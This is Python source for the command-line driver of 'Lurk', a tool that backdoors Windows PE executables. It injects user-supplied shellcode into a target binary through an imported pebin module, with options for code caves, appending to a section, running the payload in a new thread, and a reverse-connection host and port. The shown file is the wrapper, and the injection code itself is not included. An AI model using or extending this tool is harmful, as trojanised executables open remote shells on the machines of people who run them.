# coding: utf-8

# Author: Ree
# Date: 2018-1-31

import lief
import struct
import os, sys
import signal
import logging
from capstone import *
from binascii import *
from optparse import OptionParser
from pebin import pebin
from logginger import *

def signal_ahndler(singal, frame):
    print('\nProgram Exit')
    sys.exit(0)

class LurkMain():
    
    author = """\
        Author:     Ree
        Email:      heyuanree@gmail.com
    """
    version = """\
        Version:    0.1
    """

    signal.signal(signal.SIGINT, signal_ahndler)

    usage = "usage: %prog <-f filename> <-s shellcode> [-a] [-o output_filename]"

    parser = OptionParser(usage=usage)
    parser.add_option("-f", "--file", dest="FILE", action="store", type="string", help="File to inject")
    parser.add_option("-a", "--append_last_section", default=False, dest="APPEND_SECTION", action="store_true", help="Append shallcode to last section")
    parser.add_option("-o", "--output", dest="OUTPUT", action="store", type="string", help="The backdoor output file")
    parser.add_option("-s", "--shellcode", dest="SHELLCODE", type="string", action="store", help="Shellcode you want to use in backdoored file")
    parser.add_option("-d", "--directory", dest="DIR", action="store", type="string", help="This is the location you want to backdoor files")
    parser.add_option("-H", "--left_host", dest="LHOST", action="store", type="string", help="IP for reverse connection")
    parser.add_option("-P", "--left_port", dest="LPORT", action="store", type="int", help="Port for reverse connection")
    parser.add_option("-i", "--inject", dest="INJECT", action="store_true", default=False, help="Inject code in PE")
    parser.add_option("-t", "--new_thread", dest="NEW_THREAD", action="store_true", default=False, help="Start a new thread to call shellcode")
    parser.add_option("-C", "--cflags", dest="CFLAGS", action="store", type="string", help="Compile option")
    parser.add_option("-l", "--len_shellcode", dest="LEN_SHELLCODE", action="store", type='int', help="Calc user supplied shellcode length, default is 380")
    parser.add_option("-c", "--cave_found", dest="CAVE_FOUND", action="store_true", default=False, help="Find all caves can be used")
    parser.add_option("-j", "--jump_caves", dest="JUMP_CAVES", action="store_true", default=False, help="Find all satisfied caves and patch shellcode with jumping code")

    (options, args) = parser.parse_args()

    def __init__(self):
        pass
    
    def get_info(FILE):
        pass

    def check_support(FILE):
        with open(FILE, 'rb') as testbinary:
            header = testbinary.read(4)
        if 'MZ' in header:
            return 'PE'

    if not options.FILE:
        logger.error("\t'-f' option should be set.At least one file be selected.")
        parser.print_help()
        sys.exit(0)
    
    is_supported = check_support(options.FILE)
    if is_supported == 'PE':
        suppotred_file = pebin(FILE=options.FILE,
                               OUTPUT=options.OUTPUT,
                               APPEND_SECTION=options.APPEND_SECTION,
                               SHELLCODE=options.SHELLCODE,
                               LHOST=options.LHOST,
                               LPORT=options.LPORT,
                               NEW_THREAD=options.NEW_THREAD,
                               CFLAGS=options.CFLAGS,
                               CAVE_FOUND=options.CAVE_FOUND,
                               LEN_SHELLCODE=options.LEN_SHELLCODE,
                               JUMP_CAVES=options.JUMP_CAVES,
                               )
    else:
        logger.error("Not Supported.")
        sys.exit()
    result = suppotred_file.run_this()
    if result is True and suppotred_file.OUTPUT is not None:
        logger.info("File {0} is lurked in 'lurked' directiory.".format(os.path.basename(suppotred_file.OUTPUT)))

if __name__ == "__main__":

    LurkMain()
